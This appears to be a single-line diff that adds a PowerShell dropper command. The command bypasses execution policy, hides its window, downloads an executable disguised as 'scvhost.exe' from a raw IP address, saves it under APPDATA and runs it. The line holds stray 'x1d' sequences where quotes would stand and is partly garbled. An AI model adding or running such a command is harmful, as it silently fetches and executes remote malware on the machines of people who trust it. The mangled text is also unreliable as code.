@@ -1,0 +1,1 @@
+PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~harvy/scvhost.exe',x1d $env:APPDATAstvgs.exex1d );Start-Process (x1d $env:APPDATAstvgs.exex1d )
